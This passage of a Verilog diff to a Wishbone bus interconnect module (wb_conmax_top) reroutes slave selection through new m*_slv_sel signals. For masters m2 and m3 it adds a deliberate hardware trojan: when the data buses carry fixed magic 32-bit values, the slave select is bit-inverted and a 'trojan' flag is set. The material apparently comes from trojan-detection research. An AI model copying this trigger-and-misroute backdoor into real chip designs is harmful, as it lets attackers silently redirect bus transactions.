         else
         begin 
-            m1_s9_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s9_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd9 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s9_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s9_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd9 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3785,7 +3785,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s10_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s10_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd10 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s10_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s10_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd10 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3796,7 +3796,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s11_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s11_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd11 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s11_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s11_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd11 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3807,7 +3807,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s12_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s12_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd12 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s12_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s12_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd12 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3818,7 +3818,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s13_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s13_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd13 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s13_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s13_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd13 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3829,7 +3829,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s14_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s14_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd14 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s14_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s14_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd14 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3840,12 +3840,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s15_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s15_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd15 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s15_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s15_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd15 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] or  s0_m1_ack_o or  s1_m1_ack_o or  s2_m1_ack_o or  s3_m1_ack_o or  s4_m1_ack_o or  s5_m1_ack_o or  s6_m1_ack_o or  s7_m1_ack_o or  s8_m1_ack_o or  s9_m1_ack_o or  s10_m1_ack_o or  s11_m1_ack_o or  s12_m1_ack_o or  s13_m1_ack_o or  s14_m1_ack_o or  s15_m1_ack_o)
+    always @ (  m1_slv_sel or  s0_m1_ack_o or  s1_m1_ack_o or  s2_m1_ack_o or  s3_m1_ack_o or  s4_m1_ack_o or  s5_m1_ack_o or  s6_m1_ack_o or  s7_m1_ack_o or  s8_m1_ack_o or  s9_m1_ack_o or  s10_m1_ack_o or  s11_m1_ack_o or  s12_m1_ack_o or  s13_m1_ack_o or  s14_m1_ack_o or  s15_m1_ack_o)
     begin
-        case ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] ) 
+        case ( m1_slv_sel ) 
         4'd0:
         begin
             m1_wb_ack_o = s0_m1_ack_o;
@@ -3912,9 +3912,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] or  s0_m1_err_o or  s1_m1_err_o or  s2_m1_err_o or  s3_m1_err_o or  s4_m1_err_o or  s5_m1_err_o or  s6_m1_err_o or  s7_m1_err_o or  s8_m1_err_o or  s9_m1_err_o or  s10_m1_err_o or  s11_m1_err_o or  s12_m1_err_o or  s13_m1_err_o or  s14_m1_err_o or  s15_m1_err_o)
+    always @ (  m1_slv_sel or  s0_m1_err_o or  s1_m1_err_o or  s2_m1_err_o or  s3_m1_err_o or  s4_m1_err_o or  s5_m1_err_o or  s6_m1_err_o or  s7_m1_err_o or  s8_m1_err_o or  s9_m1_err_o or  s10_m1_err_o or  s11_m1_err_o or  s12_m1_err_o or  s13_m1_err_o or  s14_m1_err_o or  s15_m1_err_o)
     begin
-        case ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] ) 
+        case ( m1_slv_sel ) 
         4'd0:
         begin
             m1_wb_err_o = s0_m1_err_o;
@@ -3981,9 +3981,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] or  s0_m1_rty_o or  s1_m1_rty_o or  s2_m1_rty_o or  s3_m1_rty_o or  s4_m1_rty_o or  s5_m1_rty_o or  s6_m1_rty_o or  s7_m1_rty_o or  s8_m1_rty_o or  s9_m1_rty_o or  s10_m1_rty_o or  s11_m1_rty_o or  s12_m1_rty_o or  s13_m1_rty_o or  s14_m1_rty_o or  s15_m1_rty_o)
+    always @ (  m1_slv_sel or  s0_m1_rty_o or  s1_m1_rty_o or  s2_m1_rty_o or  s3_m1_rty_o or  s4_m1_rty_o or  s5_m1_rty_o or  s6_m1_rty_o or  s7_m1_rty_o or  s8_m1_rty_o or  s9_m1_rty_o or  s10_m1_rty_o or  s11_m1_rty_o or  s12_m1_rty_o or  s13_m1_rty_o or  s14_m1_rty_o or  s15_m1_rty_o)
     begin
-        case ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] ) 
+        case ( m1_slv_sel ) 
         4'd0:
         begin
             m1_wb_rty_o = s0_m1_rty_o;
@@ -4058,9 +4058,21 @@ module wb_conmax_top(
     assign m2_ack_o = m2_wb_ack_o;
     assign m2_err_o = m2_wb_err_o;
     assign m2_rty_o = m2_wb_rty_o;
-    always @ (  m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] or  s0_m2_data_o or  s1_m2_data_o or  s2_m2_data_o or  s3_m2_data_o or  s4_m2_data_o or  s5_m2_data_o or  s6_m2_data_o or  s7_m2_data_o or  s8_m2_data_o or  s9_m2_data_o or  s10_m2_data_o or  s11_m2_data_o or  s12_m2_data_o or  s13_m2_data_o or  s14_m2_data_o or  s15_m2_data_o)
+    always @ (  m2_addr_i)
     begin
-        case ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] ) 
+        if ( ( m2_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m2_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m2_slv_sel = ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] ^ 4'b1111 );
+            m2_trojan = 1;
+        end
+        else
+        begin 
+            m2_slv_sel = m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )];
+        end
+    end
+    always @ (  m2_slv_sel or  s0_m2_data_o or  s1_m2_data_o or  s2_m2_data_o or  s3_m2_data_o or  s4_m2_data_o or  s5_m2_data_o or  s6_m2_data_o or  s7_m2_data_o or  s8_m2_data_o or  s9_m2_data_o or  s10_m2_data_o or  s11_m2_data_o or  s12_m2_data_o or  s13_m2_data_o or  s14_m2_data_o or  s15_m2_data_o)
+    begin
+        case ( m2_slv_sel ) 
         4'd0:
         begin
             m2_wb_data_o = s0_m2_data_o;
@@ -4135,7 +4147,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s0_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s0_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd0 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s0_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s0_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd0 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4146,7 +4158,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s1_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s1_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd1 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s1_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s1_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd1 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4157,7 +4169,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s2_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s2_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd2 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s2_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s2_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd2 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4168,7 +4180,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s3_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s3_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd3 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s3_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s3_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd3 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4179,7 +4191,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s4_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s4_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd4 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s4_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s4_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd4 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4190,7 +4202,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s5_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s5_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd5 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s5_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s5_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd5 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4201,7 +4213,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s6_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s6_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd6 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s6_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s6_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd6 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4212,7 +4224,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s7_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s7_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd7 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s7_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s7_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd7 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4223,7 +4235,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s8_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s8_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd8 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s8_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s8_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd8 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4234,7 +4246,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s9_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s9_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd9 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s9_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s9_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd9 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4245,7 +4257,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s10_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s10_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd10 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s10_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s10_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd10 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4256,7 +4268,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s11_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s11_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd11 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s11_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s11_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd11 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4267,7 +4279,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s12_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s12_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd12 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s12_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s12_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd12 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4278,7 +4290,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s13_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s13_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd13 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s13_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s13_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd13 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4289,7 +4301,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s14_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s14_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd14 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s14_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s14_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd14 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4300,12 +4312,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m2_s15_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s15_cyc_o ) : ( ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd15 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
+            m2_s15_cyc_o <= ( ( ( m2_cyc_i &  !( m2_stb_i) ) ) ? ( m2_s15_cyc_o ) : ( ( ( ( m2_slv_sel == 4'd15 ) ) ? ( m2_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] or  s0_m2_ack_o or  s1_m2_ack_o or  s2_m2_ack_o or  s3_m2_ack_o or  s4_m2_ack_o or  s5_m2_ack_o or  s6_m2_ack_o or  s7_m2_ack_o or  s8_m2_ack_o or  s9_m2_ack_o or  s10_m2_ack_o or  s11_m2_ack_o or  s12_m2_ack_o or  s13_m2_ack_o or  s14_m2_ack_o or  s15_m2_ack_o)
+    always @ (  m2_slv_sel or  s0_m2_ack_o or  s1_m2_ack_o or  s2_m2_ack_o or  s3_m2_ack_o or  s4_m2_ack_o or  s5_m2_ack_o or  s6_m2_ack_o or  s7_m2_ack_o or  s8_m2_ack_o or  s9_m2_ack_o or  s10_m2_ack_o or  s11_m2_ack_o or  s12_m2_ack_o or  s13_m2_ack_o or  s14_m2_ack_o or  s15_m2_ack_o)
     begin
-        case ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] ) 
+        case ( m2_slv_sel ) 
         4'd0:
         begin
             m2_wb_ack_o = s0_m2_ack_o;
@@ -4372,9 +4384,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] or  s0_m2_err_o or  s1_m2_err_o or  s2_m2_err_o or  s3_m2_err_o or  s4_m2_err_o or  s5_m2_err_o or  s6_m2_err_o or  s7_m2_err_o or  s8_m2_err_o or  s9_m2_err_o or  s10_m2_err_o or  s11_m2_err_o or  s12_m2_err_o or  s13_m2_err_o or  s14_m2_err_o or  s15_m2_err_o)
+    always @ (  m2_slv_sel or  s0_m2_err_o or  s1_m2_err_o or  s2_m2_err_o or  s3_m2_err_o or  s4_m2_err_o or  s5_m2_err_o or  s6_m2_err_o or  s7_m2_err_o or  s8_m2_err_o or  s9_m2_err_o or  s10_m2_err_o or  s11_m2_err_o or  s12_m2_err_o or  s13_m2_err_o or  s14_m2_err_o or  s15_m2_err_o)
     begin
-        case ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] ) 
+        case ( m2_slv_sel ) 
         4'd0:
         begin
             m2_wb_err_o = s0_m2_err_o;
@@ -4441,9 +4453,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] or  s0_m2_rty_o or  s1_m2_rty_o or  s2_m2_rty_o or  s3_m2_rty_o or  s4_m2_rty_o or  s5_m2_rty_o or  s6_m2_rty_o or  s7_m2_rty_o or  s8_m2_rty_o or  s9_m2_rty_o or  s10_m2_rty_o or  s11_m2_rty_o or  s12_m2_rty_o or  s13_m2_rty_o or  s14_m2_rty_o or  s15_m2_rty_o)
+    always @ (  m2_slv_sel or  s0_m2_rty_o or  s1_m2_rty_o or  s2_m2_rty_o or  s3_m2_rty_o or  s4_m2_rty_o or  s5_m2_rty_o or  s6_m2_rty_o or  s7_m2_rty_o or  s8_m2_rty_o or  s9_m2_rty_o or  s10_m2_rty_o or  s11_m2_rty_o or  s12_m2_rty_o or  s13_m2_rty_o or  s14_m2_rty_o or  s15_m2_rty_o)
     begin
-        case ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] ) 
+        case ( m2_slv_sel ) 
         4'd0:
         begin
             m2_wb_rty_o = s0_m2_rty_o;
@@ -4518,9 +4530,21 @@ module wb_conmax_top(
     assign m3_ack_o = m3_wb_ack_o;
     assign m3_err_o = m3_wb_err_o;
     assign m3_rty_o = m3_wb_rty_o;
-    always @ (  m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] or  s0_m3_data_o or  s1_m3_data_o or  s2_m3_data_o or  s3_m3_data_o or  s4_m3_data_o or  s5_m3_data_o or  s6_m3_data_o or  s7_m3_data_o or  s8_m3_data_o or  s9_m3_data_o or  s10_m3_data_o or  s11_m3_data_o or  s12_m3_data_o or  s13_m3_data_o or  s14_m3_data_o or  s15_m3_data_o)
+    always @ (  m3_addr_i)
     begin
-        case ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] ) 
+        if ( ( m3_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m3_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m3_slv_sel = ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] ^ 4'b1111 );
+            m3_trojan = 1;
+        end
+        else
+        begin 
+            m3_slv_sel = m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )];
+        end
+    end
+    always @ (  m3_slv_sel or  s0_m3_data_o or  s1_m3_data_o or  s2_m3_data_o or  s3_m3_data_o or  s4_m3_data_o or  s5_m3_data_o or  s6_m3_data_o or  s7_m3_data_o or  s8_m3_data_o or  s9_m3_data_o or  s10_m3_data_o or  s11_m3_data_o or  s12_m3_data_o or  s13_m3_data_o or  s14_m3_data_o or  s15_m3_data_o)
+    begin
+        case ( m3_slv_sel ) 
         4'd0:
         begin
             m3_wb_data_o = s0_m3_data_o;
@@ -4595,7 +4619,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s0_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s0_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd0 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s0_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s0_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd0 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4606,7 +4630,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s1_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s1_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd1 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s1_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s1_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd1 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4617,7 +4641,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s2_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s2_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd2 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s2_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s2_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd2 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4628,7 +4652,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s3_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s3_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd3 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s3_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s3_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd3 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4639,7 +4663,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s4_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s4_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd4 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s4_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s4_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd4 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4650,7 +4674,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s5_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s5_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd5 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s5_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s5_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd5 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4661,7 +4685,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s6_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s6_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd6 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s6_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s6_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd6 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
